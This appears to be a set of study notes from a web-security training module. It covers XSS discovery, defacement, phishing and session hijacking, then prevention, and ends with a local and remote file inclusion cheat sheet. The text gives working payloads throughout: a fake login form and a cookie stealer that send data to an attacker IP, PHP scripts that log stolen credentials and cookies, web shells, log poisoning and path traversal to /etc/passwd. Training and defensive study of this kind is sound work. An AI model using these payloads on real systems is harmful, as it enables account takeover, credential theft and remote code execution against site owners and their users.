	> Some of the common open-source tools that can assist us in XSS discovery are XSS Strike(https://github.com/s0md3v/XSStrike), Brute XSS(https://github.com/rajeshmajumdar/BruteXSS), and XSSer(https://github.com/epsylon/xsser). We can try XSS Strike by cloning it to our VM with git clone:
		m1l0js@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
		m1l0js@htb[/htb]$ cd XSStrike
		m1l0js@htb[/htb]$ pip install -r requirements.txt
		m1l0js@htb[/htb]$ python xsstrike.py

	> We can then run the script and provide it a URL with a parameter using -u. Let's try using it with our Reflected XSS example from the earlier section:
		m1l0js@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

	> As we can see, the tool identified the parameter as vulnerable to XSS from the first payload. Try to verify the above payload by testing it on one of the previous exercises. You may also try testing out the other tools and run them on the same exercises to see how capable they are in detecting XSS vulnerabilities.

* Manual Discovery
	> When it comes to manual XSS discovery, the difficulty of finding the XSS vulnerability depends on the level of security of the web application. Basic XSS vulnerabilities can usually be found through testing various XSS payloads, but identifying advanced XSS vulnerabilities requires advanced code review skills.

* XSS Payloads
	> The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on PayloadAllTheThings(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in PayloadBox(https://github.com/payloadbox/xss-payload-list). We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.
	> Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
	> You will notice that the majority of the above payloads do not work with our example web applications, even though we are dealing with the most basic type of XSS vulnerabilities. This is because these payloads are written for a wide variety of injection points (like injecting after a single quote) or are designed to evade certain security measures (like sanitization filters). Furthermore, such payloads utilize a variety of injection vectors to execute JavaScript code, like basic <script> tags, other HTML Attributes like <img>, or even CSS Style attributes. This is why we can expect that many of these payloads will not work in all test cases, as they are designed to work with certain types of injections.
	> This is why it is not very efficient to resort to manually copying/pasting XSS payloads, as even if a web application is vulnerable, it may take us a while to identify the vulnerability, especially if we have many input fields to test. This is why it may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered. This can help us in advanced cases where XSS tools cannot easily send and compare payloads. This way, we would have the advantage of customizing our tool to our target web application. However, this is an advanced approach to XSS discovery, and it is not part of the scope of this module.

* Code Review
	> The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.
	> In the previous section, we looked at a basic example of HTML code review when discussing the Source and Sink for DOM-based XSS vulnerabilities. This gave us a quick look at how front-end code review works in identifying XSS vulnerabilities, although on a very basic front-end example.
	> We are unlikely to find any XSS vulnerabilities through payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release. For such cases, manual code review may reveal undetected XSS vulnerabilities, which may survive public releases of common web applications. These are also advanced techniques that are out of the scope of this module. Still, if you are interested in learning them, the Secure Coding 101: JavaScript and the Whitebox Pentesting 101: Command Injection modules thoroughly cover this topic.


-=-=-
[+] Defacing
	> Now that we understand the different types of XSS and various methods of discovering XSS vulnerabilities in web pages, we can start learning how to exploit these XSS vulnerabilities. As previously mentioned, the damage and the scope of an XSS attack depends on the type of XSS, a stored XSS being the most critical, while a DOM-based being less so.
	> One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. Defacing a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it, like when hackers defaced the UK National Health Service (NHS) back in 2018. Such attacks can carry great media echo and may significantly affect a company's investments and share prices, especially for banks and technology firms.
	> Although many other vulnerabilities may be utilized to achieve the same thing, stored XSS vulnerabilities are among the most used vulnerabilities for doing so.

* Defacement Elements
	> We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn't really the primary target.
	> Three HTML elements are usually utilized to change the main look of a web page:
    		- Background Color document.body.style.background
    		- Background document.body.background
    		- Page Title document.title
    		- Page Text DOM.innerHTML

	> We can utilize two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page, as we will see next.

* Changing Background
	> Let's go back to our Stored XSS exercise and use it as a basis for our attack. You can go back to the Stored XSS section to spawn the server and follow the next steps.
	> To change a web page's background, we can choose a certain color or use an image. We will use a color as our background since most defacing attacks use a dark color for the background. To do so, we can use the following payload:
		<script>document.body.style.background = "#141d2b"</script>
	> Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like = "black".
	> Once we add our payload to the To-Do list, we will see that the background color changed:
	> This will be persistent through page refreshes and will appear for anyone who visits the page, as we are utilizing a stored XSS vulnerability.
	> Another option would be to set an image to the background using the following payload:
		<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
	> Try using the above payload to see how the final result may look.

* Changing Page Title
	> We can change the page title from 2Do to any title of our choosing, using the document.title JavaScript function:
		<script>document.title = 'HackTheBox Academy'</script>
	> We can see from the page window/tab that our new title has replaced the previous one:

* Changing Page Text
	> When we want to change the text displayed on the web page, we can utilize various JavaScript functions for doing so. For example, we can change the text of a specific HTML element/DOM using the innerHTML function:
		document.getElementById("todo").innerHTML = "New Text"
	> We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the jQuery library must have been imported within the page source):
		$("#todo").html('New Text');

	> This gives us various options to customize the text on the web page and make minor adjustments to meet our needs. However, as hacking groups usually leave a simple message on the web page and leave nothing else on it, we will change the entire HTML code of the main body, using innerHTML, as follows:
		document.getElementsByTagName('body')[0].innerHTML = "New Text"
	> As we can see, we can specify the body element with document.getElementsByTagName('body'), and by specifying [0], we are selecting the first body element, which should change the entire text of the web page. We may also use jQuery to achieve the same thing. However, before sending our payload and making a permanent change, we should prepare our HTML code separately and then use innerHTML to set our HTML code to the page source.
	> For our exercise, we will borrow the HTML code from the main page of Hack The Box Academy:
		<center>
		    <h1 style="color: white">Cyber Security Training</h1>
		    <p style="color: white">by 
		        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
		    </p>
		</center>

	> Tip: It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.
	> We will minify the HTML code into a single line and add it to our previous XSS payload. The final payload should be as follows:
		<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
	> Once we add our payload to the vulnerable To-Do list, we will see that our HTML code is now permanently part of the web page's source code and shows our message for anyone who visits the page:
	> By using three XSS payloads, we were able to successfully deface our target web page. If we look at the source code of the web page, we will see the original source code still exists, and our injected payloads appear at the end:
		<div></div><ul class="list-unstyled" id="todo"><ul>
		<script>document.body.style.background = "#141d2b"</script>
		</ul><ul><script>document.title = 'HackTheBox Academy'</script>
		</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
		</ul></ul>

	> This is because our injected JavaScript code changes the look of the page when it gets executed, which in this case, is at the end of the source code. If our injection was in an element in the middle of the source code, then other scripts or elements may get added to after it, so we would have to account for them to get the final look we need.
	> However, to ordinary users, the page looks defaced and shows our new look.


[+] Phishing
	> Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.
	> Furthermore, suppose we were to identify an XSS vulnerability in a web application for a particular organization. In that case, we can use such an attack as a phishing simulation exercise, which will also help us evaluate the security awareness of the organization's employees, especially if they trust the vulnerable web application and do not expect it to harm them.

* XSS Discovery
	> We start by attempting to find the XSS vulnerability in the web application at /phishing from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:
		http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
	> This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the dead image url icon:
	> So, we must run the XSS Discovery process we previously learned to find a working XSS payload. Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page.
	> Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.

* Login Form Injection
	> Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.
	> We can easily find an HTML code for a basic login form, or we can write our own login form. The following example should present a login form:
		<h3>Please login to continue</h3>
		<form action=http://OUR_IP>
		    <input type="username" name="username" placeholder="Username">
		    <input type="password" name="password" placeholder="Password">
		    <input type="submit" name="submit" value="Login">
		</form>

	> In the above HTML code, OUR_IP is the IP of our VM, which we can find with the (ip a) command under tun0. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:
		<div>
		<h3>Please login to continue</h3>
		<input type="text" placeholder="Username">
		<input type="text" placeholder="Password">
		<input type="submit" value="Login">
		<br><br>
		</div>

	> Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function document.write(), and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the write function, the final JavaScript code should be as follows:

		document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

	> We can now inject this JavaScript code using our XSS payload (i.e., instead of running the alert(window.origin) JavaScript Code). In this case, we are exploiting a Reflected XSS vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the Reflected XSS section, and the page should look as follows when we visit the malicious URL:

* Cleaning Up
	> We can see that the URL field is still displayed, which defeats our line of "Please login to continue". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function document.getElementById().remove() function.
	> To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking [CTRL+SHIFT+C] and then clicking on the element we need: Page Inspector Picker
	> As we see in both the source code and the hover text, the url form has the id urlform:

		<form role="form" action="index.php" method="GET" id='urlform'>
		    <input type="text" placeholder="Image URL" name="url">
		</form>

	> So, we can now use this id with the remove() function to remove the URL form:
		document.getElementById('urlform').remove();

	> Now, once we add this code to our previous JavaScript code (after the document.write function), we can use this new JavaScript code in our payload:

		document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();

	> When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:
	> We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
		...PAYLOAD... <!-- 

	> As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login:
	> We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended. Also try logging into the above login form and see what happens.

* Credential Stealing
	> Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error This site can’t be reached. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a site can’t be reached error.
	> So, let us start a simple netcat server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:
		m1l0js@htb[/htb]$ sudo nc -lvnp 80
	> Now, let's attempt to login with the credentials test:test, and check the netcat output we get (don't forget to replace OUR_IP in the XSS payload with your actual IP):

	> As we can see, we can capture the credentials in the HTTP request URL (/?username=test&password=test). If any victim attempts to log in with the form, we will get their credentials.
	> However, as we are only listening with a netcat listener, it will not handle the HTTP request correctly, and the victim would get an Unable to connect error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.
	> The following PHP script should do what we need, and we will write it to a file on our VM that we'll call index.php and place it in /tmp/tmpserver/ (don't forget to replace SERVER_IP with the ip from our exercise):

		<?php
		if (isset($_GET['username']) && isset($_GET['password'])) {
		    $file = fopen("creds.txt", "a+");
		    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
		    header("Location: http://SERVER_IP/phishing/index.php");
		    fclose($file);
		    exit();
		}
		?>

	 > Now that we have our index.php file ready, we can start a PHP listening server, which we can use instead of the basic netcat listener we used earlier:

		m1l0js@htb[/htb]$ mkdir /tmp/tmpserver
		m1l0js@htb[/htb]$ cd /tmp/tmpserver
		m1l0js@htb[/htb]$ vi index.php #at this step we wrote our index.php file
		m1l0js@htb[/htb]$ sudo php -S 0.0.0.0:80
		PHP 7.4.15 Development Server (http://0.0.0.0:80) started

	> Let's try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page:
	> If we check the creds.txt file in our Pwnnox, we see that we did get the login credentials:
		m1l0js@htb[/htb]$ cat creds.txt
		Username: test | Password: test

	> With everything ready, we can start our PHP server and send the URL that includes our XSS payload to our victim, and once they log into the form, we will get their credentials and use them to access their accounts.


[+] Session Hijacking
	> Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.
	> With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.

* Blind XSS Detection
	> We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a Blind XSS vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
	> Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:
    		- Contact Forms
    		- Reviews
    		- User Details
    		- Support Tickets
    		- HTTP User-Agent header

	> Let's run the test on the web application on (/hijacking) in the server at the end of this section. We see a User Registration page with multiple fields, so let's try to submit a test user to see how the form handles the data:
	> As we can see, once we submit the form we get the following message:
		(https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg)

	> This indicates that we will not see how our input will be handled or how it will look in the browser since it will appear for the Admin only in a certain Admin Panel that we do not have access to. In normal (i.e., non-blind) cases, we can test each field until we get an alert box, like what we've been doing throughout the module. However, as we do not have access over the Admin panel in this case, how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?
	> To do so, we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.
	> However, this introduces two issues:
    		- How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
    		- How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?

* Loading a Remote Script
	> In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:
		<script src="http://OUR_IP/script.js"></script>
	> So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:
		<script src="http://OUR_IP/username"></script>
	> If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

		<script src=http://OUR_IP></script>
		'><script src=http://OUR_IP></script>
		"><script src=http://OUR_IP></script>
		javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
		<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
		<script>$.getScript("http://OUR_IP")</script>

	> As we can see, various payloads start with an injection like '>, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the XSS Discovery section, if we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload for a successful injection. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.
	> Before we start sending payloads, we need to start a listener on our VM, using netcat or php as shown in a previous section:

		m1l0js@htb[/htb]$ mkdir /tmp/tmpserver
		m1l0js@htb[/htb]$ cd /tmp/tmpserver
		m1l0js@htb[/htb]$ sudo php -S 0.0.0.0:80
		PHP 7.4.15 Development Server (http://0.0.0.0:80) started

	> Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:
		<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
		<script src=http://OUR_IP/username></script> #this goes inside the username field
		...SNIP...

	> Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.
	> Once we submit the form, we wait a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload, and so on. Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.
	> Try testing various remote script XSS payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload.

* Session Hijacking
	> Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.
	> A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
	> There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):
		document.location='http://OUR_IP/index.php?c='+document.cookie;
		new Image().src='http://OUR_IP/index.php?c='+document.cookie;
	> Using any of the two payloads should work in sending us a cookie, but we'll use the second one, as it simply adds an image to the page, which may not be very malicious looking, while the first navigates to our cookie grabber PHP page, which may look suspicious.
	> We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:
		Code: javascript
		new Image().src='http://OUR_IP/index.php?c='+document.cookie
	> Now, we can change the URL in the XSS payload we found earlier to use script.js (don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload):
		Code: html
		<script src=http://OUR_IP/script.js></script>

	> With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
	> We can save the following PHP script as index.php, and re-run the PHP server again:

		<?php
		if (isset($_GET['c'])) {
		    $list = explode(";", $_GET['c']);
		    foreach ($list as $key => $value) {
		        $cookie = urldecode($value);
		        $file = fopen("cookies.txt", "a+");
		        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
		        fclose($file);
		    }
		}
		?>

	> Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for script.js, which in turn will make another request with the cookie value:

		10.10.10.10:52798 [200]: /script.js
		10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2

	> As mentioned earlier, we get the cookie value right in the terminal, as we can see. However, since we prepared a PHP script, we also get the cookies.txt file with a clean log of cookies:

		m1l0js@htb[/htb]$ cat cookies.txt 
		Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2

	> Finally, we can use this cookie on the login.php page to access the victim's account. To do so, once we navigate to /hijacking/login.php, we can click Shift+F9 in Firefox to reveal the Storage bar in the Developer Tools. Then, we can click on the + button on the top right corner and add our cookie, where the Name is the part before = and the Value is the part after = from our stolen cookie:
	> Once we set our cookie, we can refresh the page and we will get access as the victim:

[+] XSS Prevention
	> By now, we should have a good understanding of what an XSS vulnerability is and its different types, how to detect an XSS vulnerability, and how to exploit XSS vulnerabilities. We will conclude the module by learning how to defend against XSS vulnerabilities.
	> As discussed previously, XSS vulnerabilities are mainly linked to two parts of the web application: A Source like a user input field and a Sink that displays the input data. These are the main two points that we should focus on securing, both in the front-end and in the back-end.
	> The most important aspect of preventing XSS vulnerabilities is proper input sanitization and validation on both the front and back end. In addition to that, other security measures can be taken to help prevent XSS attacks.

* Front-end
	> As the front-end of the web application is where most (but not all) of the user input is taken from, it is essential to sanitize and validate the user input on the front-end using JavaScript.
	> Input Validation
		- For example, in the exercise of the XSS Discovery section, we saw that the web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code:
			function validateEmail(email) {
			    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			    return re.test($("#login input[name=email]").val());
			}
		- As we can see, this code is testing the email input field and returning true or false whether it matches the Regex validation of an email format.

	> Input Sanitization
		- In addition to input validation, we should alway ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the DOMPurify(https://github.com/cure53/DOMPurify) JavaScript library, as follows:
			<script type="text/javascript" src="dist/purify.min.js"></script>
			let clean = DOMPurify.sanitize( dirty );
		- This will escape any special characters with a backslash \, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.

	> Direct Input
		+ Finally, we should always ensure that we never use user input directly within certain HTML tags, like:
    			- JavaScript code <script></script>
    			- CSS Style Code <style></style>
    			- Tag/Attribute Fields <div name='INPUT'></div>
    			- HTML Comments <!-- -->
		+ If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
    			- DOM.innerHTML
    			- DOM.outerHTML
    			- document.write()
    			- document.writeln()
    			- document.domain
		+ An the following jQuery functions:
    			- html()
    			- parseHTML()
    			- add()
    			- append()
    			- prepend()
    			- after()
    			- insertAfter()
    			- before()
    			- insertBefore()
    			- replaceAll()
    			- replaceWith()

		- As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.
* Back-end
	> On the other end, we should also ensure that we prevent XSS vulnerabilities with measures on the back-end to prevent Stored and Reflected XSS vulnerabilities. As we saw in the XSS Discovery section exercise, even though it had front-end input validation, this was not enough to prevent us from injecting a malicious payload into the form. So, we should have XSS prevention measures on the back-end as well. This can be achieved with Input and Output Sanitization and Validation, Server Configuration, and Back-end Tools that help prevent XSS vulnerabilities.
	> Input Validation
		- Input validation in the back-end is quite similar to the front-end, and it uses Regex or library functions to ensure that the input field is what is expected. If it does not match, then the back-end server will reject it and not display it.
		+ An example of E-Mail validation on a PHP back-end is the following:
			Code: php
			
			if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
			    // do task
			} else {
			    // reject input - do not display it
			}
		- For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.

	> Input Sanitization
		- When it comes to input sanitization, then the back-end plays a vital role, as front-end input sanitization can be easily bypassed by sending custom GET or POST requests. Luckily, there are very strong libraries for various back-end languages that can properly sanitize any user input, such that we ensure that no injection can occur.
		+ For example, for a PHP back-end, we can use the addslashes function to sanitize user input by escaping special characters with a backslash:
			addslashes($_GET['email'])
		- In any case, direct user input (e.g. $_GET['email']) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.
		- For a NodeJS back-end, we can also use the DOMPurify library as we did with the front-end, as follows:
			import DOMPurify from 'dompurify';
			var clean = DOMPurify.sanitize(dirty);

	> Output HTML Encoding
		+ Another important aspect to pay attention to in the back-end is Output Encoding. This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability. For a PHP back-end, we can use the htmlspecialchars or the htmlentities functions, which would encode certain special characters into their HTML codes (e.g. < into &lt), so the browser will display them correctly, but they will not cause any injection of any sort:
			Code: php
			htmlentities($_GET['email']);
		+ For a NodeJS back-end, we can use any library that does HTML encoding, like html-entities, as follows:
			Code: javascript
			import encode from 'html-entities';
			encode('<'); // -> '&lt;'

		- Once we ensure that all user input is validated, sanitized, and encoded on output, we should significantly reduce the risk of having XSS vulnerabilities.

	> Server Configuration
		+ In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:
    			- Using HTTPS across the entire domain
    			- Using XSS prevention headers, like X-XSS-Protection.
    			- Using the appropriate Content-Type for the page, like X-Content-Type-Options=nosniff.
    			- Using Content-Security-Policy options, like script-src 'self', which only allows locally hosted scripts.
    			- Using the HttpOnly and Secure cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

* In addition to the above, having a good Web Application Firewall (WAF) can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like ASP.NET. => (https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0)
* In the end, we must do our best to secure our web applications against XSS vulnerabilities using such XSS prevention techniques. Even after all of this is done, we should practice all of the skills we learned in this module and attempt to identify and exploit XSS vulnerabilities in any potential input fields, as secure coding and secure configurations may still leave gaps and vulnerabilities that can be exploited. If we practice defending the website using both offensive and defensive techniques, we should reach a reliable level of security against XSS vulnerabilities.



-=-=-=-=-=

[+] Intro to File Inclusions


## Local File Inclusion

| **Command** | **Description** |
| --------------|-------------------|
| **Basic LFI** |
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| **LFI Bypasses** |
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |


## Remote Code Execution

| **Command** | **Description** |
| --------------|-------------------|
| **PHP Wrappers** |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
| **RFI** |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |
| **LFI + Upload** |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
| **Log Poisoning** |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |


## Misc

| **Command** | **Description** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
